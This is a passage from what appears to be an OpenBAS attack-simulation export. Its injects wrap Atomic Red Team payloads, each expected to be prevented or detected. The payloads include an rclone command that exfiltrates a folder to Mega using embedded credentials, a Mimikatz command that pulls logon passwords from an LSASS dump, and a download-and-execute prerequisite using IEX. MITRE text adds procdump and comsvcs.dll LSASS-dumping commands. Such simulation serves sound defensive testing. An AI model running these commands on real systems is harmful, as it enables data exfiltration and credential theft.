link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"5b9553cc-379f-4bf3-b8c3-716d76f1547e\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "6f3013ad-feb8-44db-b611-ef32523340a7",
        "payload_type" : "Command",
        "payload_name" : "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
        "payload_description" : "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "6074f8cb-3b2d-404b-bdd4-ae061b0ab0dc",
          "attack_pattern_name" : "Exfiltration to Cloud Storage",
          "attack_pattern_description" : "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",
          "attack_pattern_external_id" : "T1567.002",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "06717ecb-fc13-423f-a680-59ae1ef4967d",
            "phase_external_id" : "TA0010",
            "phase_stix_id" : "x-mitre-tactic--9a4e74ab-5008-408c-84bf-a10dfbc53462",
            "phase_name" : "Exfiltration",
            "phase_shortname" : "exfiltration",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
            "phase_order" : 12
          } ]
        } ],
        "payload_cleanup_executor" : "psh",
        "payload_cleanup_command" : "cd \"#{rclone_path}\"\n.\\rclone.exe purge #{remote_share}:test\n.\\rclone.exe config delete #{remote_share}:\nRemove-Item #{rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path}\"\nRemove-Item \"#{dir_to_copy}\" -recurse -force\n",
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "rclone_path",
          "default_value" : "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "rclone_config_path",
          "default_value" : "$env:appdata",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "dir_to_copy",
          "default_value" : "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "mega_user_account",
          "default_value" : "atomictesting@outlook.com",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "mega_user_password",
          "default_value" : "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "remote_share",
          "default_value" : "T1567002",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/rclone.zip",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/rclone.zip",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\rclone_zip_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/rclone.zip",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\rclone.zip\"\nExpand-archive -path \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\rclone.zip\" -destinationpath \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\T1567.002\\\" -force\n",
          "check_command" : "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n",
          "description" : "rclone must exist at (#{rclone_path})\n"
        } ],
        "payload_external_id" : "8529ee44-279a-4a19-80bf-b846a40dda58",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:54.882674Z",
        "payload_updated_at" : "2025-07-03T14:51:30.710478Z",
        "command_executor" : "psh",
        "command_content" : "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:54.896367Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:54.896368Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "6074f8cb-3b2d-404b-bdd4-ae061b0ab0dc",
        "attack_pattern_name" : "Exfiltration to Cloud Storage",
        "attack_pattern_description" : "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",
        "attack_pattern_external_id" : "T1567.002",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "06717ecb-fc13-423f-a680-59ae1ef4967d",
          "phase_external_id" : "TA0010",
          "phase_stix_id" : "x-mitre-tactic--9a4e74ab-5008-408c-84bf-a10dfbc53462",
          "phase_name" : "Exfiltration",
          "phase_shortname" : "exfiltration",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
          "phase_order" : 12
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "6cd4932d-229a-4dc7-a900-f9f1e3cb1c3d",
    "inject_title" : "Offline Credential Theft With Mimikatz",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "input_file" : "%tmp%\\lsass.DMP",
      "mimikatz_exe" : "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 480,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Offline Credential Theft With Mimikatz",
          "fr" : "Offline Credential Theft With Mimikatz"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "input_file",
          "label" : "input_file",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%tmp%\\lsass.DMP",
          "type" : "text"
        }, {
          "key" : "mimikatz_exe",
          "label" : "mimikatz_exe",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "d83b22be-e673-49a3-b2f0-594db6389791",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "d83b22be-e673-49a3-b2f0-594db6389791",
      "injector_contract_labels" : {
        "en" : "Offline Credential Theft With Mimikatz",
        "fr" : "Offline Credential Theft With Mimikatz"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Offline Credential Theft With Mimikatz\",\"fr\":\"Offline Credential Theft With Mimikatz\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"input_file\",\"label\":\"input_file\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%tmp%\\\\lsass.DMP\",\"type\":\"text\"},{\"key\":\"mimikatz_exe\",\"label\":\"mimikatz_exe\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\x64\\\\mimikatz.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"d83b22be-e673-49a3-b2f0-594db6389791\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "8c00a336-881d-4c44-935b-f45a18eeabc7",
        "payload_type" : "Command",
        "payload_name" : "Offline Credential Theft With Mimikatz",
        "payload_description" : "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "4190cfcc-2763-46cf-a647-ca328122dfa1",
          "attack_pattern_name" : "LSASS Memory",
          "attack_pattern_description" : "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
          "attack_pattern_external_id" : "T1003.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
            "phase_external_id" : "TA0006",
            "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
            "phase_name" : "Credential Access",
            "phase_shortname" : "credential-access",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "phase_order" : 7
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : true,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "input_file",
          "default_value" : "%tmp%\\lsass.DMP",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "mimikatz_exe",
          "default_value" : "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
          "check_command" : "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
          "description" : "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n"
        }, {
          "executor" : "psh",
          "get_command" : "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n",
          "check_command" : "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n",
          "description" : "Lsass dump must exist at specified location (#{input_file})\n"
        } ],
        "payload_external_id" : "453acf13-1dbd-47d7-b28a-172ce9228023",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:33.816055Z",
        "payload_updated_at" : "2025-07-03T14:49:44.920453Z",
        "command_executor" : "cmd",
        "command_content" : "\"#{mimikatz_exe}\" \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:33.829103Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:33.829103Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "4190cfcc-2763-46cf-a647-ca328122dfa1",
        "attack_pattern_name" : "LSASS Memory",
        "attack_pattern_description" : "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
        "attack_pattern_external_id" : "T1003.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
          "phase_external_id" : "TA0006",
          "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
          "phase_name" : "Credential Access",
          "phase_shortname" : "credential-access",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
          "phase_order" : 7
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "495beca8-854b-45b4-9123-bba7b01f8521",
    "inject_title" : "Network Service Discovery (advanced ip scanner)",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
